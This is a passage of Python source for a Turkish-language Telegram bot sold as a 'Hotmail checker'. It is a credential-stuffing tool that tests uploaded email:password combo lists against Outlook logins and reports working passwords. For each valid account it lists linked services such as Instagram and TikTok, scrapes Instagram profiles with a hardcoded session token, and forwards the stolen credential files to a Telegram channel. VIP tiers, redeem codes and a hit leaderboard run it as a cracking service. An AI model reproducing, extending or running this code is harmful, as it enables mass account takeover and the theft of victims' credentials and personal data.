                    linked_total += len(found_services)
                    
                    all_hits.append({
                        "email": email,
                        "password": password,
                        "services": found_services
                    })
                    
                    if found_services:
                        services_text = "\n".join([f"✅ {s}" for s in found_services])
                        hit_msg = f"""
━━━━━━━━━━━━━━━━━━━━
⚡ YENİ HİT BULUNDU #{hits}
━━━━━━━━━━━━━━━━━━━━

📧 Email: {email}
🔑 Şifre: {password}

🔗 Bağlı Servisler:
{services_text}

━━━━━━━━━━━━━━━━━━━━
💎 {MY_SIGNATURE} tarafından yapıldı
"""
                        bot.send_message(chat_id, hit_msg, parse_mode='HTML')
                    else:
                        hit_msg = f"""
━━━━━━━━━━━━━━━━━━━━
⚡ YENİ HİT BULUNDU #{hits}
━━━━━━━━━━━━━━━━━━━━

📧 Email: {email}
🔑 Şifre: {password}

⚠️ Bağlı servis bulunamadı

━━━━━━━━━━━━━━━━━━━━
💎 {MY_SIGNATURE} tarafından yapıldı
"""
                        bot.send_message(chat_id, hit_msg, parse_mode='HTML')
            
            elif result["status"] == "RETRY":
                retry_count += 1
            else:
                bad += 1
            
            if i % 5 == 0 or i == total - 1:
                elapsed = time.time() - start_time
                cpm = int((i / elapsed * 60)) if elapsed > 0 else 0
                progress = (i / total * 100)
                
                try:
                    bot.edit_message_text(
                        f"⚡ <b>KONTROL EDİLİYOR</b>\n\n"
                        f"✅ Hit: {hits}\n"
                        f"❌ Bad: {bad}\n"
                        f"🔄 Tekrar: {retry_count}\n"
                        f"🔗 Bağlı: {linked_total}\n\n"
                        f"━━━━━━━━━━━━━━━━━━━━\n"
                        f"📊 İlerleme: {i+1}/{total} ({progress:.1f}%)\n"
                        f"⏱ Hız: {cpm} DKB\n\n"
                        f"🔍 Mevcut: {email}",
                        chat_id,
                        progress_msg.message_id,
                        parse_mode='HTML',
                        reply_markup=stop_scan_keyboard(user_id)
                    )
                except:
                    pass
            
            time.sleep(0.1)
            
        except Exception as e:
            bad += 1
            continue
    
    try:
        bot.unpin_chat_message(chat_id, progress_msg.message_id)
    except:
        pass
    
    if all_hits:
        hits_by_service = {}
        for hit_data in all_hits:
            for service in hit_data.get('services', []):
                if service not in hits_by_service:
                    hits_by_service[service] = []
                hits_by_service[service].append(hit_data)
        
        for service_name, service_hits in hits_by_service.items():
            safe_service_name = service_name.replace(" ", "_").replace("+", "Plus")
            hits_file_path = f"hits_{safe_service_name}_by_{MY_SIGNATURE.replace('@', '')}.txt"
            
            with open(hits_file_path, 'w', encoding='utf-8') as f:
                f.write(f"# {MY_SIGNATURE} tarafından yapıldı {CHANNEL}\n")
                f.write(f"# Tarama Tarihi: {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
                f.write(f"# Servis: {service_name}\n")
                f.write(f"# Toplam Hit: {len(service_hits)}\n\n")
                
                for idx, hit_data in enumerate(service_hits, 1):
                    f.write(f"------hit bulundu #{idx}----\n")
                    f.write(f"Email: {hit_data['email']}\n")
                    f.write(f"Şifre: {hit_data['password']}\n")
                    f.write(f"Servis: {service_name}\n")
                    f.write(f"\n")
            
            try:
                with open(hits_file_path, 'rb') as f:
                    bot.send_document(chat_id, f,
                                    caption=f"📁 {service_name} Hitleri\n\n"
                                           f"Toplam: {len(service_hits)} hit\n"
                                           f"💎 {MY_SIGNATURE}")
            except:
                pass
            
            if os.path.exists(hits_file_path):
                os.remove(hits_file_path)
        
        hits_without_services = [h for h in all_hits if not h.get('services')]
        if hits_without_services:
            hits_file_path = f"hits_ServisSiz_by_{MY_SIGNATURE.replace('@', '')}.txt"
            with open(hits_file_path, 'w', encoding='utf-8') as f:
                f.write(f"# {MY_SIGNATURE} tarafından yapıldı {CHANNEL}\n")
                f.write(f"# Tarama Tarihi: {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
                f.write(f"# Bağlı servis olmayan hitler\n")
                f.write(f"# Toplam: {len(hits_without_services)}\n\n")
                
                for idx, hit_data in enumerate(hits_without_services, 1):
                    f.write(f"------hit bulundu #{idx}----\n")
                    f.write(f"Email: {hit_data['email']}\n")
                    f.write(f"Şifre: {hit_data['password']}\n")
                    f.write(f"\n")
            
            try:
                with open(hits_file_path, 'rb') as f:
                    bot.send_document(chat_id, f,
                                    caption=f"📁 Hitler (Servis Yok)\n\n"
                                           f"Toplam: {len(hits_without_services)} hit\n"
                                           f"💎 {MY_SIGNATURE}")
            except:
                pass
            
            if os.path.exists(hits_file_path):
                os.remove(hits_file_path)
    
    bot.send_message(chat_id,
                    f"✅ <b>TARAMA TAMAMLANDI!</b>\n\n"
                    f"📊 Sonuçlar:\n"
                    f"• Hit: {hits}\n"
                    f"• Bad: {bad}\n"
                    f"• Tekrar: {retry_count}\n"
                    f"• Bağlı: {linked_total}\n"
                    f"• Toplam: {total}\n\n"
                    f"💎 {MY_SIGNATURE}",
                    parse_mode='HTML')
    
    update_stats(user_id, hits, bad, total)
    
    if os.path.exists(file_path):
        os.remove(file_path)
    
    if user_id in user_sessions:
        del user_sessions[user_id]
    
    active_scans[user_id] = False

# Botu Çalıştır
if __name__ == "__main__":
    print("="*50)
    print("🤖 Skyline HOTMAIL Checker Bot - ULTIMATE")
    print(f"👤 Admin ID: {ADMIN_ID}")
    print(f"💎 Yapan: {MY_SIGNATURE}")
    print("✅ Tüm Özellikler: AKTİF")
    print("="*50)
    bot.infinity_polling()

# ═══════════════════════════════════════════════════════════════════════════
# YENİ ÖZELLİKLER - @voidsafarov tarafından eklendi
# ═══════════════════════════════════════════════════════════════════════════

# Sonuçlar kanalı (Yerel dosya depolama yok)
RESULTS_CHANNEL = "-1002465589285"

# JSON Veritabanı dosyası
USERS_DB_JSON = "users_database.json"

# Redeem kodları deposu
REDEEM_CODES_FILE = "redeem_codes.json"

import random
from io import BytesIO

# JSON Veritabanı Fonksiyonları
def load_json_users():
    """JSON'dan kullanıcıları yükle"""
    if os.path.exists(USERS_DB_JSON):
        try:
            with open(USERS_DB_JSON, 'r', encoding='utf-8') as f:
                return json.load(f)
        except:
            return {"users": []}
    return {"users": []}

def save_json_users(data):
    """Kullanıcıları JSON'a kaydet"""
    with open(USERS_DB_JSON, 'w', encoding='utf-8') as f:
        json.dump(data, f, indent=2, ensure_ascii=False)

def get_json_user(user_id):
    """JSON'dan kullanıcı al"""
    data = load_json_users()
    for user in data['users']:
        if user['id'] == user_id:
            return user
    return None

def add_json_user(user_id, username, first_name):
    """JSON'a kullanıcı ekle"""
    data = load_json_users()
    
    if get_json_user(user_id):
        return
    
    new_user = {
        "id": user_id,
        "name": first_name or "Kullanıcı",
        "username": username or "bilinmiyor",
        "link_account": f"tg://user?id={user_id}",
        "account_number": str(user_id),
        "membership": "Ücretsiz",
        "points": 0,
        "total_scans": 0,
        "total_hits": 0,
        "is_vip": False,
        "vip_until": None,
        "is_banned": False,
        "last_claim": None,
        "join_date": datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    }
    
    data['users'].append(new_user)
    save_json_users(data)

def update_json_user(user_id, **kwargs):
    """JSON kullanıcısını güncelle"""
    data = load_json_users()
    for user in data['users']:
        if user['id'] == user_id:
            for key, value in kwargs.items():
                user[key] = value
            save_json_users(data)
            return True
    return False

def get_json_stats():
    """JSON'dan istatistik al"""
    data = load_json_users()
    users = data.get('users', [])
    
    total = len(users)
    vips = sum(1 for u in users if u.get('is_vip'))
    banned = sum(1 for u in users if u.get('is_banned'))
    
    vip_1h = vip_1d = vip_1w = vip_1m = vip_forever = 0
    
    for u in users:
        if u.get('is_vip'):
            vip_until = u.get('vip_until')
            if vip_until == "Forever":
                vip_forever += 1
            elif vip_until:
                try:
                    vip_date = datetime.datetime.strptime(vip_until, "%Y-%m-%d %H:%M:%S")
                    now = datetime.datetime.now()
                    remaining = (vip_date - now).days
                    
                    if remaining >= 25:
                        vip_1m += 1
                    elif remaining >= 6:
                        vip_1w += 1
                    elif remaining >= 1:
                        vip_1d += 1
                    else:
                        vip_1h += 1
                except:
                    pass
    
    return {
        "total": total,
        "vips": vips,
        "banned": banned,
        "vip_1h": vip_1h,
        "vip_1d": vip_1d,
        "vip_1w": vip_1w,
        "vip_1m": vip_1m,
        "vip_forever": vip_forever
    }

# Kanala Gönder
def send_to_channel(text, file_content=None, filename=None):
    """Sonuçları kanala gönder"""
    try:
        if file_content:
            file_obj = BytesIO(file_content.encode('utf-8'))
            file_obj.name = filename or "results.txt"
            bot.send_document(RESULTS_CHANNEL, file_obj, caption=text[:1000])
        else:
            bot.send_message(RESULTS_CHANNEL, text[:4000])
        return True
    except:
        return False

# Redeem Kodu Sistemi
def load_redeem_codes():
    """Redeem kodlarını yükle"""
    if os.path.exists(REDEEM_CODES_FILE):
        try:
            with open(REDEEM_CODES_FILE, 'r') as f:
                return json.load(f)
        except:
            return {}
    return {}

def save_redeem_codes(codes):
    """Redeem kodlarını kaydet"""
    with open(REDEEM_CODES_FILE, 'w') as f:
        json.dump(codes, f, indent=2)

def generate_redeem_code(vip_duration="1d", points=0):
    """Redeem kodu oluştur"""
    code = ''.join(random.choices('ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789', k=12))
    codes = load_redeem_codes()
    codes[code] = {
        "vip_duration": vip_duration,
        "points": points,
        "used": False,
        "used_by": None,
        "created_at": datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    }
    save_redeem_codes(codes)
    return code

def use_redeem_code(code, user_id):
    """Redeem kodunu kullan"""
    codes = load_redeem_codes()
    
    if code not in codes:
        return False, "Geçersiz kod!"
    
    if codes[code]['used']:
        return False, "Kod zaten kullanılmış!"
    
    codes[code]['used'] = True
    codes[code]['used_by'] = user_id
    codes[code]['used_at'] = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    save_redeem_codes(codes)
    
    vip_duration = codes[code]['vip_duration']
    points = codes[code]['points']
    
    user = get_json_user(user_id)
    if not user:
        return False, "Kullanıcı bulunamadı!"
    
    if vip_duration:
        add_vip(user_id, user['username'], vip_duration)
    
    if points > 0:
        current_points = user.get('points', 0)
        update_json_user(user_id, points=current_points + points)
    
    return True, f"✅ Kullanıldı!\nVIP: {vip_duration}\nPuan: +{points}"

# Günlük Ödül
def can_claim_daily(user_id):
    """Günlük ödül alınabilir mi kontrol et"""
    user = get_json_user(user_id)
    if not user:
        return False
    
    last_claim = user.get('last_claim')
    if not last_claim:
        return True
    
    try:
        last = datetime.datetime.strptime(last_claim, "%Y-%m-%d %H:%M:%S")
        now = datetime.datetime.now()
        diff = (now - last).total_seconds()
        return diff >= 86400  # 24 saat
    except:
        return True

def claim_daily(user_id):
    """Günlük ödülü al"""
    if not can_claim_daily(user_id):
        return False, "Bugün zaten aldınız!"
    
    user = get_json_user(user_id)
    current_points = user.get('points', 0)
    
    update_json_user(user_id, 
                    points=current_points + 10,
                    last_claim=datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S"))
    
    return True, "✅ 10 puan kazandınız!"

# Liderlik Tablosu
def get_leaderboard():
    """En iyi 10 kullanıcıyı al"""
    data = load_json_users()
    users = data.get('users', [])
    
    sorted_users = sorted(users, key=lambda x: x.get('total_hits', 0), reverse=True)
    
    return sorted_users[:10]


# ═══════════════════════════════════════════════════════════════════════════
# YENİ MESAJ HANDLER'LARI
# ═══════════════════════════════════════════════════════════════════════════

# JSON kullanan /start override
@bot.message_handler(commands=['start'])
def start_command_json(message):
    """JSON ile Start"""
    user_id = message.from_user.id
    username = message.from_user.username
    first_name = message.from_user.first_name
    
    add_json_user(user_id, username, first_name)
    
    user = get_json_user(user_id)
    if user and user.get('is_banned'):
        bot.send_message(user_id, "❌ Yasaklandınız!")
        return
    
    welcome = f"""
╔══════════════════════════════════════╗
║  🔒 HOTMAIL CHECKER BOT v2.0  🔒  ║
╚══════════════════════════════════════╝

Hoş geldiniz <b>{first_name}</b>! ✨

🆔 ID: <code>{user_id}</code>
👑 Üyelik: {user.get('membership', 'Ücretsiz') if user else 'Ücretsiz'}
⭐ Puan: {user.get('points', 0) if user else 0}

🎯 <b>Özellikler:</b>
• 70+ Servis
• 12+ AI Platformu
• TikTok Full Capture (VIP)
• Tek Hesap Kontrol
• Günlük Ödül & Puan

━━━━━━━━━━━━━━━━━━━━━━━━━━
💎 {MY_SIGNATURE}
🌐 {CHANNEL}
"""
    
    bot.send_message(user_id, welcome, parse_mode='HTML')
    bot.send_message(user_id, "Bir seçenek seçin:", reply_markup=main_menu_keyboard(user_id))

@bot.message_handler(func=lambda m: m.text == "🔑 Kodu Kullan")
def redeem_key_handler(message):
    """Redeem kodu kullan"""
    user_id = message.from_user.id
    
    msg = bot.send_message(user_id, "🔑 Redeem kodunuzu gönderin:")
    user_sessions[user_id] = {"mode": "redeem_code"}

@bot.message_handler(func=lambda m: user_sessions.get(m.from_user.id, {}).get('mode') == 'redeem_code')
def process_redeem(message):
    """Redeem işle"""
    user_id = message.from_user.id
    code = message.text.strip().upper()
    
    success, msg_text = use_redeem_code(code, user_id)
    
    bot.send_message(user_id, msg_text)
    
    if user_id in user_sessions:
        del user_sessions[user_id]

@bot.message_handler(func=lambda m: m.text == "🏆 Liderlik Tablosu")
def leaderboard_handler(message):
    """Liderlik tablosu"""
    top_users = get_leaderboard()
    
    if not top_users:
        bot.send_message(message.chat.id, "Henüz kullanıcı yok!")
        return
    
    msg = "🏆 <b>TOP 10 LİDERLİK TABLOSU</b>\n\n"
    
    medals = ["🥇", "🥈", "🥉"]
    
    for i, user in enumerate(top_users, 1):
        medal = medals[i-1] if i <= 3 else f"{i}."
        name = user.get('name', 'Kullanıcı')
        hits = user.get('total_hits', 0)
        msg += f"{medal} {name} - {hits} hit\n"
    
    msg += f"\n━━━━━━━━━━━━━━━━━━━━━━━━━━\n💎 {MY_SIGNATURE}"
    
    bot.send_message(message.chat.id, msg, parse_mode='HTML')

@bot.message_handler(func=lambda m: m.text == "🎁 Günlük Ödül")
def daily_claim_handler(message):
    """Günlük ödül"""
    user_id = message.from_user.id
    
    success, msg_text = claim_daily(user_id)
    
    bot.send_message(user_id, msg_text)

# Admin: Redeem Kodu Oluştur
@bot.message_handler(commands=['gencode'])
def generate_code_handler(message):
    """Redeem kodu oluştur (Sadece Admin)"""
    if message.from_user.id != ADMIN_ID:
        return
    
    try:
        parts = message.text.split()
        vip_duration = parts[1] if len(parts) > 1 else "1d"
        points = int(parts[2]) if len(parts) > 2 else 0
        
        code = generate_redeem_code(vip_duration, points)
        
        bot.send_message(message.chat.id, 
            f"✅ Kod Oluşturuldu!\n\n"
            f"🔑 Kod: <code>{code}</code>\n"
            f"👑 VIP: {vip_duration}\n"
            f"⭐ Puan: {points}",
            parse_mode='HTML')
    except:
        bot.send_message(message.chat.id, 
            "Kullanım: /gencode [süre] [puan]\n\n"
            "Örnek: /gencode 1d 50")


# ═══════════════════════════════════════════════════════════════════════════
# BAŞLANGIÇ İSTATİSTİKLERİ İLE ANA PROGRAM
# ═══════════════════════════════════════════════════════════════════════════

if __name__ == "__main__":
    print("="*70)
    print("╔══════════════════════════════════════════════════════════════════╗")
    print("║                                                                  ║")
    print("║      🔒 HOTMAIL CHECKER BOT v2.0 - GELİŞMİŞ EDİSYON           ║")
    print("║                                                                  ║")
    print("╚══════════════════════════════════════════════════════════════════╝")
    print("="*70)
    print()
    print(f"💎 Yapan: {MY_SIGNATURE}")
    print(f"🌐 Web: {CHANNEL}")
    print()
    print("="*70)
    
    if not os.path.exists(USERS_DB_JSON):
        save_json_users({"users": []})
        print("✅ JSON Veritabanı oluşturuldu")
    
    stats = get_json_stats()
    
    print("📊 İSTATİSTİKLER:")
    print("="*70)
    print(f"  Adminler: 1")
    print(f"  Üyeler: {stats['total']}")
    print(f"  VIP Üyeler: {stats['vips']}")
    print(f"  Yasaklı Üyeler: {stats['banned']}")
    print()
    print(f"  1 Saatlik Üyelik: {stats['vip_1h']}")
    print(f"  1 Günlük Üyelik: {stats['vip_1d']}")
    print(f"  1 Haftalık Üyelik: {stats['vip_1w']}")
    print(f"  1 Aylık Üyelik: {stats['vip_1m']}")
    print(f"  Sonsuz: {stats['vip_forever']}")
    print()
    print(f"  {MY_SIGNATURE} tarafından yapıldı")
    print("="*70)
    print()
    print("✨ YENİ ÖZELLİKLER:")
    print("="*70)
    print("  ✅ JSON Veritabanı (SQLite yok)")
    print("  ✅ Kanala Gönder (Yerel dosya yok)")
    print("  ✅ Redeem Kodu Sistemi")
    print("  ✅ Liderlik Tablosu")
    print("  ✅ Günlük Ödül")
    print("  ✅ Tek Hesap Kontrol")
    print("  ✅ 70+ Servis")
    print("  ✅ 12+ AI Platformu")
    print("="*70)
    print()
    print("🚀 Bot çalışıyor!")
    print("="*70)
    print()
    
    try:
        bot.infinity_polling(timeout=60, long_polling_timeout=60)
    except KeyboardInterrupt:
        print("\n\n✋ Bot durduruldu")
    except Exception as e:
        print(f"\n❌ Hata: {e}")


# ═══════════════════════════════════════════════════════════════════════════
# EKLEMELER - @voidsafarov tarafından
# Yukarıdaki orijinal kod %100 korunmuştur
# ═══════════════════════════════════════════════════════════════════════════

try:
    import pycountry
except:
    print("⚠️  Uyarı: pycountry kurulu değil. Çalıştırın: pip install pycountry")
    pycountry = None

from io import BytesIO
import random

BOT_USERNAME = "@Full_InboxRobot"
RESULTS_CHANNEL = "-1002465589285"

INSTAGRAM_TOKEN = "Bearer IGT:2:eyJkc191c2VyX2lkIjoiNzk1MzQ0MjI4MDAiLCJzZXNzaW9uaWQiOiI3OTUzNDQyMjgwMCUzQWdEWWEzMXdFa1pjbDFQJTNBMjUlM0FBWWdEWC1lVTJNMlAzYV8yX3E2RUZLS1VwOExUbVllZjNubVV4ODhYaEEifQ=="

# ═══════════════════════════════════════════════════════════════════════════
# INSTAGRAM FULL CAPTURE API
# ═══════════════════════════════════════════════════════════════════════════

def get_instagram_full_info(username):
    """Yeni API kullanarak Instagram tam bilgisi al"""
    try:
        r = requests.get(
            "https://i-fallback.instagram.com/api/v1/fbsearch/ig_typeahead/",
            params={"query": username},
            headers={
                "User-Agent": "Instagram 316.0.0.38.109 Android",
                "Authorization": INSTAGRAM_TOKEN
            }
        )
        
        data = r.json()
        if not data.get("list"):
            return None
        
        user_id = data["list"][0]["user"]["id"]
        
        response = requests.post(
            f"https://i.instagram.com/api/v1/users/{user_id}/info_stream/",
            data={
                "is_prefetch": "false",
                "entry_point": "profile",
                "from_module": "search_typeahead",
                "_uuid": "6b4df3f6-8663-4439-af43-54b3e3d8dca1"
            },
            headers={
                "User-Agent": "Instagram 316.0.0.38.109 Android",
                "Authorization": INSTAGRAM_TOKEN,
                "X-IG-App-ID": "567067343352427"
            }
        )
        
        user = json.loads(response.text.strip().split('\n')[1]).get('user', {})
        
        try:
            variables = json.dumps({
                "params": {
                    "app_id": "com.bloks.www.ig.about_this_account",
                    "infra_params": {"device_id": "6b4df3f6-8663-4439-af43-54b3e3d8dca1"},
                    "bloks_versioning_id": "b07c6b5ea93d2cf8d3582bc3688f78b5adb49ace81156e669d9ca3497258bd57",
                    "params": json.dumps({"referer_type": "ProfileMore", "target_user_id": user_id})
                },
                "is_pando": True
            })
            
            r2 = requests.post(
                "https://i.instagram.com/graphql_www",
                data={
                    'method': "post", 'pretty': "false", 'format': "json",
                    'server_timestamps': "true", 'locale': "user", 'purpose': "fetch",
                    'fb_api_req_friendly_name': "IGBloksAppRootQuery",
                    'client_doc_id': "2533602983584098948018695922",
                    'variables': variables
                },
                headers={
                    "User-Agent": "Instagram 316.0.0.38.109 Android",
                    "authorization": INSTAGRAM_TOKEN
                }
            )
            
            bundle_str = r2.json()['data']['1$bloks_app(params:$params)']['screen_content']['component']['bundle']['bloks_bundle_tree']
            
            match = re.search(r'([A-Za-z]+\s+\d{4})', bundle_str)
            join_date = match.group(1) if match else "Bilinmiyor"
            
            bundle_json = json.loads(bundle_str)
            country = "Bilinmiyor"
            data_array = bundle_json.get('layout', {}).get('bloks_payload', {}).get('data', [])
            for item in data_array:
                if item.get('data', {}).get('key') == 'IG_ABOUT_THIS_ACCOUNT:about_this_account_country':
                    country = item.get('data', {}).get('initial', 'Bilinmiyor')
                    break
        except:
            join_date = "Bilinmiyor"
            country = "Bilinmiyor"
        
        return {
            'user_id': user.get('pk', 'Bilinmiyor'),
            'username': user.get('username', 'Bilinmiyor'),
            'full_name': user.get('full_name', 'Bilinmiyor'),
            'bio': user.get('biography', 'Bilinmiyor'),
            'followers': user.get('follower_count', 0),
            'following': user.get('following_count', 0),
            'posts': user.get('media_count', 0),
            'is_private': user.get('is_private', False),
            'is_verified': user.get('is_verified', False),
            'is_business': user.get('is_business', False),
            'join_date': join_date,
            'country': country,
            'profile_pic': user.get('profile_pic_url', 'Bilinmiyor')
        }
    except Exception as e:
        return None

# ═══════════════════════════════════════════════════════════════════════════
# ÜLKE TESPİTİ
# ═══════════════════════════════════════════════════════════════════════════

def get_country_flag(country_name):
    """Ülke bayrağı emojisi al"""
    if not pycountry or not country_name or country_name in ('Bilinmiyor', 'N/A'):
        return '🏳️'
    try:
        country = pycountry.countries.lookup(country_name)
        return ''.join(chr(127397 + ord(c)) for c in country.alpha_2)
    except:
        return '🏳️'

# ═══════════════════════════════════════════════════════════════════════════
# YENİ DOSYA FORMATI
# ═══════════════════════════════════════════════════════════════════════════

def create_new_format_file(service_name, hits):
    """Yeni formatta dosya oluştur: email:şifre"""
    header = f"""╔════════════════════════════════════════════════╗
║ {service_name} Hitleri - @voidsafarov                 
║ Web: crackturkey.xyz                           
╚════════════════════════════════════════════════╝

"""
    content = header
    for hit in hits:
        content += hit + "\n"
    return content

def send_to_channel_func(text, file_content=None, filename=None):
    """Kanala gönder"""
    try:
        if file_content:
            file_obj = BytesIO(file_content.encode('utf-8'))
            file_obj.name = filename or "results.txt"
            bot.send_document(RESULTS_CHANNEL, file_obj, caption=text[:1000])
        else:
            bot.send_message(RESULTS_CHANNEL, text[:4000])
        return True
    except Exception as e:
        print(f"Kanal hatası: {e}")
        return False

# ═══════════════════════════════════════════════════════════════════════════
# TEK HESAP KONTROL (Geliştirilmiş)
# ═══════════════════════════════════════════════════════════════════════════

def check_one_account_full(email, password, user_id):
    """Geliştirilmiş tek hesap kontrolü"""
    
    bot.send_message(user_id, f"🔍 Kontrol ediliyor: <code>{email}</code>", parse_mode='HTML')
    
    result = HotmailChecker.check_account(email, password)
    
    if result["status"] != "HIT":
        bot.send_message(user_id, f"❌ <b>GEÇERSİZ</b>\n\n📧 <code>{email}</code>", parse_mode='HTML')
        return
    
    token = result.get("token")
    cid = result.get("cid")
    
    bot.send_message(user_id, f"✅ <b>GEÇERLİ!</b>\n\n🔍 Servisler kontrol ediliyor...", parse_mode='HTML')
    
    services = HotmailChecker.check_services(email, password, token, cid, SERVICES_ALL)
    
    if not services:
        bot.send_message(user_id, f"📧 <code>{email}:{password}</code>\n\n❌ Servis bulunamadı", parse_mode='HTML')
        return
    
    if "Instagram" in services:
        bot.send_message(user_id, "📸 Instagram tespit edildi! Detaylar alınıyor...")
        
        ig_username = email.split('@')[0]
        ig_info = get_instagram_full_info(ig_username)
        
        if ig_info:
            flag = get_country_flag(ig_info['country'])
            
            ig_text = f"""📸 <b>INSTAGRAM FULL</b>

📧 {email}:{password}

👤 {ig_info['full_name']}
🆔 @{ig_info['username']}
📝 {ig_info['bio'][:100]}

📊 İstatistik:
• Takipçi: {ig_info['followers']:,}
• Takip: {ig_info['following']:,}
• Gönderi: {ig_info['posts']}

📅 Katılım: {ig_info['join_date']}
{flag} {ig_info['country']}

🔒 Gizli: {'Evet' if ig_info['is_private'] else 'Hayır'}
✓ Doğrulandı: {'Evet' if ig_info['is_verified'] else 'Hayır'}

💎 {MY_SIGNATURE} | 🌐 {CHANNEL}"""
            
            bot.send_message(user_id, ig_text, parse_mode='HTML')
            
            if ig_info['profile_pic'] != 'Bilinmiyor':
                try:
                    bot.send_photo(user_id, ig_info['profile_pic'])
                except:
                    pass
    
    if "TikTok" in services:
        bot.send_message(user_id, "🎵 TikTok tespit edildi! Detaylar alınıyor...")
        
        tk_result = HotmailChecker.check_tiktok_full(email, password, token, cid)
        
        if tk_result and tk_result.get('has_tiktok'):
            tk_text = f"""🎵 <b>TIKTOK FULL</b>

📧 {email}:{password}

👤 @{tk_result.get('username', 'Bilinmiyor')}
👥 {format_number(tk_result.get('followers', 0))} takipçi
🎬 {tk_result.get('videos', 0)} video
❤️ {format_number(tk_result.get('likes', 0))} beğeni

✓ Doğrulandı: {'Evet' if tk_result.get('verified') else 'Hayır'}

💎 {MY_SIGNATURE} | 🌐 {CHANNEL}"""
            
            bot.send_message(user_id, tk_text, parse_mode='HTML')
    
    summary = f"""✅ <b>KONTROL TAMAMLANDI</b>

📧 <code>{email}:{password}</code>

📊 Servisler ({len(services)}):
{chr(10).join(f'• {s}' for s in services)}

💎 {MY_SIGNATURE} | 🌐 {CHANNEL}"""
    
    bot.send_message(user_id, summary, parse_mode='HTML')


# ═══════════════════════════════════════════════════════════════════════════
# YENİ TARAMA SEÇENEKLERI: Tek Hesap Kontrol + Instagram Full Capture
# ═══════════════════════════════════════════════════════════════════════════

@bot.callback_query_handler(func=lambda call: call.data == 'scan_check_one')
def handle_check_one(call):
    user_id = call.from_user.id
    
    if is_banned(user_id):
        bot.answer_callback_query(call.id, "❌ Yasaklandınız!", show_alert=True)
        return
    
    bot.answer_callback_query(call.id)
    
    bot.send_message(user_id, """🔟 <b>TEK HESAP KONTROL</b>

Gönderin: <code>email@outlook.com:şifre</code>

Örnek:
<code>ornek@outlook.com:Sifre123</code>

━━━━━━━━━━━━━━━━━━━━━━━━━━
💎 @voidsafarov | 🌐 crackturkey.xyz""", parse_mode='HTML')
    
    user_sessions[user_id] = {"mode": "check_one_account"}

@bot.message_handler(func=lambda m: user_sessions.get(m.from_user.id, {}).get('mode') == 'check_one_account')
def process_check_one(message):
    user_id = message.from_user.id
    
    try:
        if ':' not in message.text:
            bot.send_message(user_id, "❌ Geçersiz format! Kullanın: email:şifre")
            return
        
        email, password = message.text.strip().split(':', 1)
        check_one_account_full(email, password, user_id)
        
    except Exception as e:
        bot.send_message(user_id, f"❌ Hata: {str(e)}")
    
    if user_id in user_sessions:
        del user_sessions[user_id]

@bot.callback_query_handler(func=lambda call: call.data == 'scan_instagram_full')
def handle_instagram_full(call):
    user_id = call.from_user.id
    
    if is_banned(user_id):
        bot.answer_callback_query(call.id, "❌ Yasaklandınız!", show_alert=True)
        return
    
    if not is_vip(user_id):
        bot.answer_callback_query(call.id, "❌ Sadece VIP!", show_alert=True)
        return
    
    bot.answer_callback_query(call.id)
    
    can_scan_result, wait_time = can_scan(user_id)
    if not can_scan_result:
        bot.send_message(user_id, f"⏰ Bekleyin {wait_time}")
        return
    
    bot.send_message(user_id, """1️⃣1️⃣ <b>INSTAGRAM FULL CAPTURE</b>

📤 Combo dosyası gönderin (.txt)

Format: email:şifre

━━━━━━━━━━━━━━━━━━━━━━━━━━
💎 @voidsafarov | 🌐 crackturkey.xyz""", parse_mode='HTML')
    
    user_sessions[user_id] = {"mode": "instagram_full_capture"}

def process_instagram_scan(user_id, combos):
    """Instagram Full Capture taramasını işle"""
    
    bot.send_message(user_id, f"📸 Instagram taraması başlıyor...\n📊 Combo: {len(combos)}")
    
    hits = []
    checked = 0
    ig_hits = 0
    
    for combo in combos[:50]:
        if user_id in active_scans and not active_scans[user_id]:
            bot.send_message(user_id, "⏹️ Durduruldu")
            break
        
        try:
            email, password = combo.split(':', 1)
            
            result = HotmailChecker.check_account(email, password)
            
            if result["status"] == "HIT":
                token = result.get("token")
                cid = result.get("cid")
                
                ig_check = HotmailChecker.check_services(email, password, token, cid, {"Instagram": "security@mail.instagram.com"})
                
                if ig_check and "Instagram" in ig_check:
                    ig_username = email.split('@')[0]
                    ig_info = get_instagram_full_info(ig_username)
                    
                    if ig_info:
                        ig_hits += 1
                        flag = get_country_flag(ig_info['country'])
                        
                        hit_line = f"{email}:{password} | {flag} {ig_info['country']} | {ig_info['followers']:,} takipçi"
                        hits.append(hit_line)
                        
                        bot.send_message(user_id, 
                            f"📸 Hit #{ig_hits}\n"
                            f"👤 @{ig_info['username']}\n"
                            f"👥 {ig_info['followers']:,} takipçi")
            
            checked += 1
            
            if checked % 10 == 0:
                bot.send_message(user_id, f"📊 {checked}/{len(combos)} | Hit: {ig_hits}")
        
        except:
            checked += 1
            continue
    
    if hits:
        file_content = create_new_format_file("Instagram_Full", hits)
        
        file_obj = BytesIO(file_content.encode('utf-8'))
        file_obj.name = "Instagram_Full.txt"
        
        bot.send_document(user_id, file_obj,
            caption=f"✅ Tamamlandı!\n📊 Kontrol: {checked}\n📸 Hit: {ig_hits}\n\n💎 @r2xzzs")
        
        send_to_channel_func(f"Instagram Full: {ig_hits} hit", file_content, "Instagram_Full.txt")
    else:
        bot.send_message(user_id, f"✅ Bitti!\nKontrol: {checked}\n❌ Hit bulunamadı")
    
    update_last_scan(user_id)
    
    if user_id in active_scans:
        del active_scans[user_id]
    if user_id in user_sessions:
        del user_sessions[user_id]

@bot.message_handler(content_types=['document'], func=lambda m: user_sessions.get(m.from_user.id, {}).get('mode') == 'instagram_full_capture')
def handle_instagram_file(message):
    user_id = message.from_user.id
    
    try:
        file_info = bot.get_file(message.document.file_id)
        downloaded = bot.download_file(file_info.file_path)
        
        text = downloaded.decode('utf-8', errors='ignore')
        combos = [line.strip() for line in text.split('\n') if line.strip() and ':' in line]
        
        if not combos:
            bot.send_message(user_id, "❌ Geçerli combo bulunamadı!")
            return
        
        bot.send_message(user_id, f"✅ {len(combos)} combo\n🔍 Başlıyor...")
        
        active_scans[user_id] = True
        
        threading.Thread(target=process_instagram_scan, args=(user_id, combos), daemon=True).start()
        
    except Exception as e:
        bot.send_message(user_id, f"❌ Hata: {e}")


# ═══════════════════════════════════════════════════════════════════════════
